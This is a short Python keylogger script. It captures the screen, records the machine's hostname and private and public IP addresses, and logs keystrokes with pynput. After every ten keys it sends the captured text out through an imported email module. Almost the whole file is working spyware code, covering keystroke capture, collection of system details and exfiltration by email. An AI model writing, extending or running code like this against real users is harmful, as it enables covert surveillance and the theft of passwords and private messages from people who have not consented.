import pynput
from pynput.keyboard import Key, Listener
import platform  # for computer system informaion
import socket   # socket info of system
from requests import get
import time
from PIL import ImageGrab # Imaging Library adds image processing capabilities 

count = 0
keys = []
# file
system_information = "systeminfo.txt"   # create system information file
screenshot_information = "screenshot.png"   # create png file


#file path
file_path ="C:\\Users\\sanke\\Documents\\pyprogram\\mainfolder"
extend = "\\" # Update with your desired file extension
file_merge = file_path + extend

# get the screenshot     
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)
    print("we take sreccenshot successfully")
    print("In folder name mainfolder")
screenshot()

# get the computer information
def computer_information():
    system_information = "systeminfo.txt" # Update with your desired system information identifier
    
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
            print("system information file create successfully")
            print("In folder name mainfolder")
        except Exception as e:
            f.write("Couldn't get Public IP Address: {}".format(e) + '\n')

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")
   
computer_information()     

def on_press(key):
    print(key, end= " ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        email(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " " 
        elif key == "Key.backspace":
            k ="_" 
        elif key.find("Key")>0:
            k = ""
        message += k
    print(message)
    import send_email # send data all to email send_email.py file
    send_email.sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
 
